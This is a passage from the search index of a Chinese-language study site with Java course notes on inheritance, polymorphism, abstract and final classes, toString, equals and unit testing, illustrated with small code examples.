<li>\u5728\u4f60\u60f3\u8986\u76d6\u5b50\u7c7b\u4e2d\u9690\u85cf\u7684\u5b57\u6bb5\u6216\u65b9\u6cd5\u65f6\u5f88\u6709\u7528</li> <li>\u5982\u679c\u6211\u4eec\u5b50\u7c7b\u4e2d\u91cd\u65b0\u58f0\u660e\u4e86\u4e00\u4e2a\u5b57\u6bb5\u6216\u65b9\u6cd5\uff0c\u5b83\u4f1a\u9690\u85cf\u4ece\u7236\u7c7b\u7ee7\u627f\u7684\u6210\u5458</li> <li>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4e0d\u5efa\u8bae\u5bf9\u5b57\u6bb5\u8fd9\u4e48\u505a\uff0c\u8fd9\u901a\u5e38\u610f\u5473\u7740\u4f60\u7684\u7c7b\u8bbe\u8ba1\u5f97\u4e0d\u597d</li> </ul> </li> </ul> <pre><code>public class HiddenThing extends Thing {\n    public int x; // Hides super.x\n    protected float y; // Hides super.y\n\n    public void setSuperTo10() {\n        super.x = 10;\n        super.y = 10;\n    }\n\n    public void setTo100() {\n        x = 100;\n        y = 100;\n    }\n\n    public void print() {\n        // see full code\n    }\n\n    public void printSuper() {\n        // see full code\n    }\n\n    public static void main(String[] args) {\n        HiddenThing t = new HiddenThing();\n        t.setTo100();\n        t.setSuperTo10();\n        t.print();\n        t.printSuper();\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#super-in-inheritance-chains","title":"super in Inheritance Chains","text":"<pre><code>class A {\n    public void doSomething() {\n        System.out.println(\"A.doSomething()\");\n    }\n}\n\nclass B extends A {\n    public void doSomething() {\n        System.out.println(\"B.doSomething()\");\n    }\n}\n\nclass C extends B {\n    public void doSomething() {\n        super.doSomething();\n    }\n}\n\npublic class SuperclassMembers {\n    public static void main(String[] args) {\n        C c = new C();\n        c.doSomething();\n    }\n}\n</code></pre> <p>\u7b2c\u5341\u4e94\u884c\u7684 <code>super</code> \u6307\u5411\u7684\u5230\u5e95\u662f\u54ea\u4e2a <code>class</code></p> <p><code>super</code> always refers to the immediate superclass \u4e5f\u5c31\u662f\u6c38\u8fdc\u662f <code>extends</code> \u53c2\u6570\u540e\u9762\u7684\u90a3\u4e2a\u7c7b</p>"},{"location":"cs/java/basics/w6/#multiple-subclasses","title":"Multiple Subclasses","text":"<p>\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u88ab\u591a\u4e2a\u7c7b\u62d3\u5c55\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u590d\u6742\u7684\u7ee7\u627f\u6811\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u94fe\u5f0f\u7ed3\u6784</p> <pre><code>public class BasicSafeArray {\n    // see full code\n}\n\npublic class AppendableSafeArray extends BasicSafeArray {\n    public void append(int value) {\n        // see full code\n    }\n}\n\npublic class DeletableSafeArray extends BasicSafeArray {\n    public DeletableSafeArray(int size) {\n    super(size);\n\n    public void delete(int index) {\n        // todo\n        }\n    }\n}\n</code></pre> <p>\u90a3\u4e48\u5728\u6b63\u5f0f\u8f6f\u4ef6\u5de5\u7a0b\u4e2d\u53ef\u4ee5\u6a21\u62df\u7cfb\u7edf\u53d1\u80b2\u6811 Phylogenetic Tree \u7684\u5c42\u7ea7\u8fdb\u884c\u7c7b\u7684\u7ec4\u7ec7</p>"},{"location":"cs/java/basics/w6/#superclass-references","title":"Superclass References","text":"<p>Java \u4f5c\u4e3a\u5f3a\u7c7b\u578b\u8bed\u8a00\u5982\u679c\u6570\u636e\u7c7b\u578b\u4e0d\u5339\u914d\u4f1a\u62a5\u9519\uff0c\u9664\u975e\u6709\u81ea\u52a8\u6216\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362</p> <p>\u4f46\u662f <code>X myObj = new Y()</code> \u5982\u679c Y extends X \u5c31\u4e0d\u4f1a\u62a5\u9519\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48</p> <ul> <li>When we say Y extends X we\u2019re say that Y is a X</li> <li>This is a relationship is really what extends captures</li> </ul>"},{"location":"cs/java/basics/w6/#method-overriding","title":"Method Overriding","text":"<p>\u7531\u6b64\u5f15\u51fa <code>polymorphism</code> \u591a\u6001\u6027</p> <pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void talk() {\n        super.talk();\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class SuperGoose {\n    public static void main(String[] args) {\n        Goose a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <p>The talk method is getting hidden</p>"},{"location":"cs/java/basics/w6/#dynamic-dispatch","title":"Dynamic Dispatch","text":"<p>\u52a8\u6001\u5206\u6d3e\u662f\u4e00\u79cd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u8981\u8c03\u7528\u7684\u65b9\u6cd5\u7684\u6280\u672f\u3002\u5b83\u5141\u8bb8\u7a0b\u5e8f\u6839\u636e\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b\u800c\u4e0d\u662f\u58f0\u660e\u7684\u7c7b\u578b\u6765\u9009\u62e9\u6b63\u786e\u7684\u65b9\u6cd5\u3002\u8fd9\u4f7f\u5f97\u4ee3\u7801\u66f4\u7075\u6d3b\uff0c\u652f\u6301\u591a\u6001\u6027\uff0c\u5e76\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u884c\u4e3a\u3002</p> <pre><code>public class AnimalOverride {\n    public static void main(String[] args) {\n        Animal a = new Animal();\n        a.talk();\n        a = new Goose();\n        a.talk();\n        a = new Dog();\n        a.talk();\n    }\n}\n</code></pre> <p>\u7531\u4e8e Goose, Dog \u90fd\u662f Animal \u56e0\u6b64\u8fd9\u6837\u5206\u914d\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u4f1a\u5728\u6267\u884c\u65f6\u81ea\u52a8\u6839\u636e\u5bf9\u8c61\u7c7b\u578b\u5bfb\u627e\u65b9\u6cd5\uff0c\u8fd9\u5b9e\u73b0\u4e86\u591a\u6001\u6027</p>"},{"location":"cs/java/basics/w6/#expression","title":"Expression","text":"<p>\u8fd9\u9053\u9898\u5c31\u662f Test1 \u4e2d\u7684\uff0c\u53ef\u4ee5\u7528\u4e8e\u7f16\u5199\u7b80\u6613\u7f16\u7a0b\u8bed\u8a00</p> <pre><code>public class Expression {\n    public void describe() {\n        System.out.println(\"unknown\");\n    }\n\n    public int evaluate() {\n        return 0;\n    }\n\n    public static void main(String[] args) {\n        Expression expr = new Multiply(new Value(2), new Value(3));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Add(new Value(2), new Value(3));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Add(new Multiply(new Value(2), new Value(3)), new Value(4));\n        expr.describe();\n        System.out.println(\" = \" + expr.evaluate());\n        expr = new Value(1);\n        for (int i = 2; i &lt;= 10; i++)\n            expr = new Add(expr, new Value(i));\n        expr.describe();\n        System.out.println(\" = sum of 1 to 10 = \" + expr.evaluate());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u7528\u5176\u591a\u6001\u6027\u7684\u5e94\u7528\u53bb\u5b9e\u73b0\uff0c\u8fd9\u9053\u9898\u4e0a\u8bfe\u7684\u65f6\u5019 11 \u5b9e\u9645\u4e0a\u82b1\u8d39\u4e86\u5927\u91cf\u65f6\u95f4\u8bb2\u89e3</p>"},{"location":"cs/java/basics/w6/#multiply","title":"Multiply","text":"<pre><code>class Multiply extends Expression {\n    private Expression left;\n    private Expression right;\n\n    public Multiply(Expression left, Expression right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" * \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    public int evaluate() {\n        return left.evaluate() * right.evaluate();\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w6/#add","title":"Add","text":"<pre><code>class Add extends Expression {\n    private Expression left;\n    private Expression right;\n\n    public Add(Expression left, Expression right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" + \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    public int evaluate() {\n        return left.evaluate() + right.evaluate();\n    }\n}\n</code></pre> <pre><code>expr = new Add(new Multiply(new Value(2), new Value(3)), new Value(4));\nexpr.describe();\nSystem.out.println(\" = \" + expr.evaluate());\n</code></pre> <p>\u8fd9\u6837\u7684\u8c03\u7528\u65b9\u5f0f\u4f1a\u542f\u7528 stack tree \u5b8c\u6210</p>"},{"location":"cs/java/basics/w6/#override","title":"@Override","text":"<pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void tallk() { // Oops, typo!\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class AnimalTypo {\n    public static void main(String[] args) {\n        Animal a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <p>Method overriding \u5e38\u5e38\u6210\u4e3a\u95ee\u9898\u6765\u6e90\uff1a- @Test2</p> <ul> <li>The method must have exactly the same signature (name and parameter list), otherwise<ul> <li>It will just be a method overload \u8fc7\u8f7d\u548c\u8986\u5199\u662f\u4e24\u4e2a\u4e1c\u897f\uff0c\u628a\u7236\u7c7b\u7684\u76f8\u540c\u51fd\u6570\u91cd\u5199\u4e00\u904d\u53eb <code>override</code></li> </ul> </li> <li>If we make a typo, the compiler will not help us - \u6253\u9519\u5b57\u90a3\u4e48\u7f16\u8bd1\u5668\u4e0d\u4f1a\u5e2e\u6211\u4eec\u8bc6\u522b<ul> <li>\u52a0\u4e00\u4e2a annotation \u540e\u7f16\u8bd1\u5668\u4f1a\u76f4\u63a5\u8fd4\u56de\u9519\u8bef\uff0c\u8fd9\u79cd\u65b9\u6cd5\u66f4\u4e3a\u4e25\u8c28</li> </ul> </li> </ul>"},{"location":"cs/java/basics/w6/#sdlc","title":"SDLC","text":"<p>\u8fd9\u5c31\u662f\u8f6f\u4ef6\u5f00\u53d1\u751f\u547d\u5468\u671f\uff0c\u8bb2\u8ff0\u4e86\u8f6f\u4ef6\u5f00\u53d1\u662f\u600e\u4e48\u6837\u8fdb\u884c\u7684\uff0c\u5faa\u73af\u7684\u672c\u8d28\u53cd\u6620\u4e86\u5f00\u53d1\u8f6f\u4ef6\u901a\u5e38\u662f\u8fed\u4ee3\u7684\u3002Java \u548c\u7c7b\u5f88\u9002\u5408 SDLC \u7684\u5f00\u53d1\u6d41\u7a0b\uff1a</p> <ul> <li>\u8bbe\u8ba1\u9636\u6bb5\u9700\u8981\u628a\u95ee\u9898\u5206\u89e3\u6210\u4e00\u4e2a\u4e2a\u7c7b\u3002</li> <li>\u5b9e\u73b0\u9636\u6bb5\u5c31\u662f\u7f16\u5199\u8fd9\u4e9b\u7c7b\u3002</li> <li>\u7c7b\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u6e05\u6670\u7684\u3001\u53ef\u6d4b\u8bd5\u7684\u4ee3\u7801\u201c\u5355\u5143\u201d\uff0c\u8fd9\u4f7f\u5f97\u6d4b\u8bd5\u66f4\u5bb9\u6613\u3002</li> <li>\u6570\u636e\u9690\u85cf\u548c\u62bd\u8c61\u8ba9\u6211\u4eec\u5728\u4e0d\u6539\u53d8\u63a5\u53e3\u7684\u60c5\u51b5\u4e0b\u66f4\u65b0\u5b9e\u73b0\uff0c\u4ece\u800c\u4f7f\u7ef4\u62a4\u66f4\u5bb9\u6613\u3002</li> </ul>"},{"location":"cs/java/basics/w7/","title":"7.0 More, Packages","text":""},{"location":"cs/java/basics/w7/#more-inheritance","title":"More inheritance","text":""},{"location":"cs/java/basics/w7/#abstract","title":"abstract","text":"<pre><code>class Animal {\n    public void talk() {\n        System.out.println(\"*Generic animal sounds*\");\n    }\n}\n\nclass Goose extends Animal {\n    public void talk() {\n        System.out.println(\"Honk!\");\n    }\n}\n</code></pre> <p>Animal \u4e2d\u5f3a\u884c\u5b9e\u73b0\u7684 talk \u5f88\u5947\u602a\uff0c\u56e0\u6b64\u5982\u679c\u4e0d\u5b9e\u73b0\u5c31\u9700\u8981\u7528\u5230 <code>abstract</code></p>"},{"location":"cs/java/basics/w7/#abstractanimal","title":"AbstractAnimal","text":"<pre><code>abstract class Animal {\n    public abstract void talk();\n}\n\nclass Goose extends Animal {\n    @Override\n    public void talk() {\n        System.out.println(\"Honk!\");\n    }\n}\n\npublic class AbstractAnimal {\n    public static void main(String[] args) {\n        Animal a = new Goose();\n        a.talk();\n    }\n}\n</code></pre> <ul> <li>\u4efb\u4f55\u7c7b\u90fd\u53ef\u4ee5\u88ab\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b</li> <li><code>new Animal()</code> leads to an error, \u62bd\u8c61\u7c7b\u65e0\u6cd5\u88ab\u521d\u59cb\u5316</li> <li>\u4efb\u4f55\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u7c7b\u90fd\u9700\u8981\u88ab\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b</li> <li>\u62bd\u8c61\u65b9\u6cd5 need no nody</li> <li>Abstract methods must be overridden by subclasses<ul> <li>unless the subclass is abstract too</li> </ul> </li> </ul>"},{"location":"cs/java/basics/w7/#mistakes","title":"Mistakes","text":"<pre><code>abstract class Animal {\n    public abstract void talk();\n}\n\nclass Goose extends Animal {\n    // Error: Did not override abstract method talk()\n}\n\npublic class AbstractError {\n    public static void main(String[] args) {\n        Animal a = new Animal(); // Error: Cannot instantiate the type Animal\n        a.talk();\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u5c31\u662f\u5e38\u89c1\u9519\u8bef\uff0c\u5b50\u7c7b\u6ca1\u6709\u91cd\u8f7d\uff0c\u5bf9\u62bd\u8c61\u7c7b\u8fdb\u884c\u4e86\u521d\u59cb\u5316</p>"},{"location":"cs/java/basics/w7/#final","title":"final","text":"<ul> <li>\u6709\u65f6\u5019\u6211\u4eec\u60f3\u8981\u62bd\u8c61\u7684\u53cd\u4e49\u8bcd\u3002</li> <li>\u62bd\u8c61\u65b9\u6cd5\u5fc5\u987b\u88ab\u91cd\u5199\u3002</li> <li><code>final</code> \u65b9\u6cd5\u6c38\u8fdc\u4e0d\u80fd\u88ab\u91cd\u5199\u3001\u7ee7\u627f\u3002</li> <li>\u6ce8\u610f\uff0c\u4e00\u4e2a\u6709 <code>final</code> \u65b9\u6cd5\u7684\u7c7b\u4e0d\u4e00\u5b9a\u662f <code>final</code> \u7c7b</li> </ul>"},{"location":"cs/java/basics/w7/#final-classes-and-methods","title":"<code>final</code> Classes and Methods","text":"<pre><code>abstract class Animal {\n    public abstract int numLegs();\n}\n\nclass Spider extends Animal {\n    public final int numLegs() {\n        // All spiders have 8 legs\n        return 8;\n    }\n}\n\nclass SpiderWith6Legs extends Spider {\n    // Error: Cannot override the final method from Spider\n    // public int numLegs() {\n    // return 6;\n    // }\n}\n</code></pre> <p>\u5728\u7c7b\u4e2d\u4f7f\u7528 <code>final</code> \u65b9\u6cd5\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u4efb\u4f55\u4eba\u9519\u8bef\u7684\u4ece\u4f60\u7684\u7c7b\u4e2d\u7ee7\u627f</p>"},{"location":"cs/java/basics/w7/#final-variables","title":"<code>final</code> variables","text":"<pre><code>public class FinalVariable {\n    public static void main(String[] args) {\n        final int x = 5;\n        // x = 6; // Error: Cannot assign a value to final variable 'x'\n        final double y;\n        y = 10.5;\n        // y = 1.1; // Error: Cannot assign a value to final variable 'y'\n        System.out.println(x);\n        System.out.println(y);\n    }\n}\n</code></pre> <p>\u4f5c\u4e3a\u5e38\u91cf\u4e0d\u518d\u53ef\u53d8</p> <pre><code>public class CircleTools {\n    public static final double PI = 3.14159;\n\n    public static double area(double radius) {\n        return PI * radius * radius;\n    }\n\n    public static double circumference(double radius) {\n        return 2 * PI * radius;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Area of a circle with radius 5: \" + area(5));\n        System.out.println(\"Circumference of a circle with radius 5: \" + circumference(5));\n    }\n}\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4 <code>final</code> \u8fd8\u548c <code>static</code> \u7ed1\u5b9a\u5728\u4e00\u8d77\uff0c\u76ee\u7684\u662f\u9632\u6b62\u4efb\u4f55\u4eba\u91cd\u65b0\u5b9a\u4e49\u534a\u5f84</p>"},{"location":"cs/java/basics/w7/#the-object-class","title":"The Object Class","text":"<p>Java \u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u7c7b\u53eb\u505a Object</p> <ul> <li>\u6bcf\u4e2a\u7c7b\u90fd\u7ee7\u627f\u81ea Object\uff08\u9664\u4e86 Object \u672c\u8eab\uff09</li> <li>\u8fd9\u610f\u5473\u7740 Java \u4e2d\u7684\u6bcf\u4e2a\u7c7b\u5728\u6280\u672f\u4e0a\u90fd\u5728\u540c\u4e00\u4e2a\u7ee7\u627f\u6811\u4e2d</li> <li>Object \u6709\u4e00\u4e9b\u65b9\u6cd5\uff0c\u8fd9\u610f\u5473\u7740\u6bcf\u4e2a\u7c7b\u90fd\u81ea\u5e26\u8fd9\u4e9b\u65b9\u6cd5</li> <li>\u6709\u65f6\u5019\uff0c\u4f60\u4f1a\u60f3\u8981\u91cd\u5199\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b</li> </ul> <p>\u4eca\u5929\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8 toString() \u548c equals()\u3002</p>"},{"location":"cs/java/basics/w7/#tostring","title":"<code>toString()</code>","text":"<ul> <li><code>.toString()</code> \u65b9\u6cd5\u7528\u4e8e\u5c06\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f: \u8fd9\u4e2a\u65b9\u6cd5\u7684\u4e3b\u8981\u5de5\u4f5c\u5c31\u662f\u63d0\u4f9b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6587\u672c\u63cf\u8ff0\u3002\u5f53\u4f60\u9700\u8981\u628a\u4e00\u4e2a\u5bf9\u8c61\u7528\u6587\u5b57\u8868\u8fbe\u51fa\u6765\u65f6\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u5b83\u7684 <code>toString()</code> \u65b9\u6cd5\u3002</li> <li>\u8fd9\u4e2a\u65b9\u6cd5\u5728 Object \u7c7b\u4e2d\u610f\u5473\u7740\u6240\u6709\u5bf9\u8c61\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a\u5b57\u7b26\u4e32: \u56e0\u4e3a <code>toString()</code> \u662f <code>Object</code> \u7c7b\u7684\u65b9\u6cd5\uff0c\u800c\u6240\u6709\u7c7b\u90fd\u7ee7\u627f\u81ea <code>Object</code>\uff0c\u6240\u4ee5 Java \u4e2d\u7684\u4efb\u4f55\u5bf9\u8c61\u90fd\u5177\u5907\u5c06\u81ea\u5df1\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u7684\u80fd\u529b\uff08\u5373\u4f7f\u53ea\u662f\u9ed8\u8ba4\u7684\u3001\u4e0d\u592a\u6613\u8bfb\u7684\u683c\u5f0f\uff09\u3002</li> <li>\u5f53\u6211\u4eec\u8fdb\u884c\u5b57\u7b26\u4e32\u8fde\u63a5 (\"a string\"+myObject) \u65f6\uff0cmyObject.toString() \u4f1a\u88ab\u8c03\u7528: \u5982\u679c\u4f60\u7528 <code>+</code> \u53f7\u628a\u4e00\u4e2a\u5b57\u7b26\u4e32\u548c\u4e00\u4e2a\u5bf9\u8c61\u8fde\u63a5\u8d77\u6765\uff0cJava \u4f1a\u81ea\u52a8\u8c03\u7528\u90a3\u4e2a\u5bf9\u8c61\u7684 <code>toString()</code> \u65b9\u6cd5\uff0c\u5f97\u5230\u5b83\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8fde\u63a5\u3002</li> <li>\u5bf9\u4e8e System.out.println(myObject) \u4e5f\u662f\u4e00\u6837: \u5f53\u4f60\u6253\u5370\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c<code>println</code> \u65b9\u6cd5\u5185\u90e8\u4e5f\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u5bf9\u8c61\u7684 <code>toString()</code> \u65b9\u6cd5\uff0c\u7136\u540e\u6253\u5370\u8fd4\u56de\u7684\u90a3\u4e2a\u5b57\u7b26\u4e32\u3002</li> <li>\u91cd\u5199 .toString() \u8ba9\u6211\u4eec\u80fd\u591f\u63a7\u5236\u6211\u4eec\u7684\u5bf9\u8c61\u5982\u4f55\u88ab\u6253\u5370: \u901a\u8fc7\u5728\u4f60\u81ea\u5df1\u7684\u7c7b\u91cc\u91cd\u65b0\u5b9e\u73b0 <code>toString()</code> \u65b9\u6cd5\uff08\u5373\u201c\u91cd\u5199\u201d\uff09\uff0c\u4f60\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5f53\u5bf9\u8c61\u9700\u8981\u88ab\u8868\u793a\u4e3a\u5b57\u7b26\u4e32\u65f6\uff08\u6bd4\u5982\u6253\u5370\u6216\u5b57\u7b26\u4e32\u8fde\u63a5\u65f6\uff09\uff0c\u5e94\u8be5\u663e\u793a\u6210\u4ec0\u4e48\u6837\u5b50\u3002\u8fd9\u80fd\u8ba9\u8f93\u51fa\u7684\u4fe1\u606f\u66f4\u6709\u610f\u4e49\u3001\u66f4\u6613\u4e8e\u7406\u89e3\u3002</li> </ul> <pre><code>class MyClass {\n    private int x;\n    private int y;\n\n    public MyClass(int x, int y) {\n        this.x = x;\n        this.y = y;\n    }\n\n    @Override\n    public String toString() {\n        return \"MyClass(\" + x + \"},\" + y + \")\";\n    }\n\n    public class ToString {\n        public static void main(String[] args) {\n            MyClass mc = new MyClass(5, 10);\n            System.out.println(mc);\n            System.out.println(\"mc.toString() = \" + mc);\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w7/#equals","title":"<code>equals()</code>","text":"<p>\u5c31\u50cf <code>toString()</code> \u4e00\u6837\uff0c\u6240\u6709\u7684 Java \u5bf9\u8c61\u90fd\u4ece <code>Object</code> \u7c7b\u90a3\u91cc\u514d\u8d39\u5f97\u5230\u4e86\u4e00\u4e2a\u57fa\u7840\u7248\u7684 <code>.equals()</code> \u65b9\u6cd5\u3002\u4f46\u662f\u8fd9\u4e2a\u57fa\u7840\u7248\u7684 <code>equals()</code> \u65b9\u6cd5\uff0c\u5b83\u7684\u884c\u4e3a\u8ddf <code>==</code> \u4e00\u6a21\u4e00\u6837 \u5b83\u4e5f\u53ea\u662f\u68c0\u67e5\u662f\u4e0d\u662f\u5185\u5b58\u91cc\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002\u8fd9\u901a\u5e38\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\u201c\u5185\u5bb9\u76f8\u7b49\u201d\u7684\u6bd4\u8f83\u3002\u4e0d\u50cf <code>String</code> \u7c7b\u5df2\u7ecf\u7cbe\u5fc3\u8bbe\u8ba1\u8fc7\uff0c\u5b83\u91cd\u5199\u4e86 <code>equals()</code> \u65b9\u6cd5\uff0c\u4e13\u95e8\u68c0\u67e5\u4e24\u4e2a\u5b57\u7b26\u7684\u5e8f\u5217\u5185\u5bb9\u662f\u5426\u5b8c\u5168\u4e00\u6837\u3002\u53ef\u4ee5\u53ef\u4ee5\u770b\u5230\u5176\u662f\u5982\u4f55\u81ea\u5b9a\u4e49\u539f\u672c\u9ed8\u8ba4\u51fd\u6570\u7684\uff1a</p> <pre><code>class StringPair {\n    String first, second;\n\n    public StringPair(String first, String second) {\n        this.first = first;\n        this.second = second;\n    }\n\n    @Override\n    public boolean equals(Object other) {\n        // Make sure that other is a StringPair\n        if (other instanceof StringPair) {\n            StringPair otherPair = (StringPair) other; // Cast to StringPair\n            // Use String .equals() to compare the two Strings\n            return first.equals(otherPair.first) &amp;&amp; second.equals(otherPair.second);\n        }\n        return false;\n    }\n}\n</code></pre> <p>\u7b2c\u4e5d\u884c\u91cd\u5199\u539f\u65b9\u6cd5\u7b7e\u540d</p> <pre><code>@Override\n// \u91cd\u5199\u7236\u7c7b\uff08Object\uff09\u7684 equals \u65b9\u6cd5\npublic boolean equals(Object other) { \n// \u63a5\u6536\u4efb\u4f55\u7c7b\u578b\u7684\u5bf9\u8c61 other\n</code></pre> <p>\u68c0\u67e5 <code>other</code> \u8fd9\u4e2a\u7c7b\u5c5e\u4e0d\u5c5e\u4e8e <code>StringPair</code> \u7c7b\u578b\u6216\u662f\u5176\u5b50\u7c7b\u578b\uff0c\u4e0d\u662f\u5c31\u8fd4\u56de <code>false</code></p> <p>\u662f\u7684\u8bdd\u5c06 <code>other</code> \u4ece\u901a\u7528 <code>Object</code> \u7c7b\u578b\u5f3a\u5236\u8f6c\u6362 (cast) \u6210 <code>StringPair</code> \u7c7b\u578b</p> <pre><code>// \u628a other \u4ece\u201c\u4efb\u4f55\u4e1c\u897f\u201d\u660e\u786e\u8f6c\u6362\u6210\u201cStringPair\u201d\u7c7b\u578b\n</code></pre> <p>\u7136\u540e\u501f\u7528 <code>String</code> \u7c7b\u578b\u7684 <code>equals</code> \u51fd\u6570\u5bf9\u6bd4\u5b8c\u6210\u4efb\u52a1</p> <pre><code>public class Equals { \n    // Notice how this will work regardless of which classes are really in the array \n    public static boolean allEqual(Object[] objects) { \n        if (objects.length == 0) { \n            return true; \n        } \n        Object first = objects[0]; \n        for (int i = 1; i &lt; objects.length; i++) { \n            if (!first.equals(objects[i])) { \n                return false; \n            } \n        } \n        return true; \n    } \n\n    public static void main(String[] args) { \n        StringPair[] pairs = new StringPair[3]; \n        pairs[0] = new StringPair(\"Hello\", \"World\"); \n        pairs[1] = new StringPair(\"Hello\", \"World\"); \n        pairs[2] = new StringPair(\"Hello\", \"World\"); \n\n        System.out.println(allEqual(pairs)); \n    } \n}\n</code></pre> <p>\u4ee5\u4e0a\u521b\u9020\u4e86\u4e00\u4e2a\u51fd\u6570\u53eb <code>allEqual</code> \u4e00\u6837\u501f\u7528 <code>String</code> \u7684\u76f8\u7b49\u65b9\u6cd5\u5b8c\u6210\u4efb\u52a1</p>"},{"location":"cs/java/basics/w7/#the-sdlc-and-testing","title":"The SDLC and Testing","text":"<p>SDLC \u7684\u7b2c\u4e94\u6b65\u662f <code>Testing</code></p>"},{"location":"cs/java/basics/w7/#unit-testing","title":"Unit Testing","text":"<ul> <li>\u5355\u5143\u6d4b\u8bd5\u662f\u5728\u8f6f\u4ef6\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u521b\u5efa\u7684\u81ea\u52a8\u6d4b\u8bd5</li> <li>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u662f\u552f\u4e00\u80fd\u8ba9\u4eba\u76f8\u4fe1\u4f60\u7684\u4ee3\u7801\u80fd\u6b63\u5e38\u5de5\u4f5c\u7684\u597d\u65b9\u6cd5</li> <li>\u6709\u65f6\u5019\uff0c\u4eba\u4eec\u4f1a\u9075\u5faa\u4e00\u79cd\u53eb\u505a\u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\u7684\u6d41\u7a0b</li> <li>\u9996\u5148\u5199\u6d4b\u8bd5\uff0c\u7136\u540e\u5199\u4ee3\u7801\u8ba9\u8fd9\u4e9b\u6d4b\u8bd5\u901a\u8fc7</li> <li>\u867d\u7136\u8f6f\u4ef6\u5f00\u53d1\u7684\u751f\u547d\u5468\u671f\u542c\u8d77\u6765\u53ef\u80fd\u6709\u70b9\u62bd\u8c61\uff0c\u4f46\u5355\u5143\u6d4b\u8bd5\u662f\u975e\u5e38\u5b9e\u7528\u7684</li> </ul> <p>JUnit \u662f\u65e9\u671f\u4e3b\u8981\u7684\u5355\u5143\u6d4b\u8bd5\u6846\u67b6\u4e4b\u4e00\uff0c\u5b83\u662f\u4e3a Java \u5b9a\u5236\u7684\uff0c\u529f\u80fd\u975e\u5e38\u5f3a\u5927\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5355\u72ec\u6d4b\u8bd5\u6bcf\u4e2a\u7c7b\uff01\u9488\u5bf9\u4e0d\u540c\u8bed\u8a00\u6709\u5f88\u591a\u8fd9\u6837\u7684\u6846\u67b6\u3002\u5b66\u4e60\u6846\u67b6\u4e0d\u662f\u8fd9\u95e8\u8bfe\u7a0b\u7684\u8303\u7574\uff0c\u5c3d\u7ba1\u4f60\u5e94\u8be5\u77e5\u9053\u5b83\u4eec\u7684\u5b58\u5728\u548c\u4f7f\u7528\u3002\u6211\u4eec\u4f1a\u7528\u6211\u4eec\u81ea\u5df1\u7684\uff08\u7b80\u5355\u7684\uff09\u6846\u67b6\u6765\u505a\u4e00\u4e2a\u57fa\u672c\u7684\u5355\u5143\u6d4b\u8bd5\u4ecb\u7ecd\uff0c\u5e76\u4e14\u5728\u8fc7\u7a0b\u4e2d\u4f1a\u7528\u5230\u62bd\u8c61\u548c\u6700\u7ec8\u7c7b\u3002</p>"},{"location":"cs/java/basics/w7/#simpleunittest","title":"SimpleUnitTest","text":"<pre><code>public abstract class SimpleUnitTest {\n    public static final void assertTrue(boolean condition) {\n        // See full code for details\n        // Error if condition is false\n    }\n\n    public abstract void runAllTests();\n\n    public static final void main(String[] args) {\n        // See full code for details\n        // Look for a class named arg[0]\n        // If it is a subclass of SimpleUnitTest, call runAllTests()\n    }\n}\n</code></pre> <ul> <li><code>assertTrue()</code> \u548c <code>main()</code> 